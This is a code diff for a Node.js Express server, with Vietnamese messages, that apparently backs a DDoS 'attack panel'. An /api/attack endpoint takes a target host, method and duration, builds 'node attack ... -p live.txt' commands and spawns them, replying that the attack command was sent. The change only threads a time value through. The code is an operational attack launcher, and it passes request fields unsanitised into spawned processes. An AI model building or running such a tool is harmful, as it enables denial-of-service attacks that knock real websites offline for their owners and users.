@@ -20,7 +20,7 @@ const validateInput = ({ key, host, time, method, port }) => {
   return null;
 };
 
-const executeAttack = (command) => {
+const executeAttack = (command, time) => {
   const childProcess = spawn(command.split(" ")[0], command.split(" ").slice(1), { stdio: "inherit" });
   currentPID = childProcess.pid;
   console.log(`Tiến trình ${currentPID} đã được khởi chạy.`);
@@ -52,7 +52,7 @@ const executeAttack = (command) => {
 
 const executeAllAttacks = (methods, host, time) => {
   methods.map((method) => `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`)
-    .forEach((command) => executeAttack(command));
+    .forEach((command) => executeAttack(command, time));
 };
 
 app.get("/api/attack", (req, res) => {
@@ -83,7 +83,7 @@ app.get("/api/attack", (req, res) => {
     });
   } else {
     const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
-    executeAttack(command);
+    executeAttack(command, time);
     res.json({
       status: "SUCCESS",
       message: "LỆNH TẤN CÔNG ĐÃ GỬI",
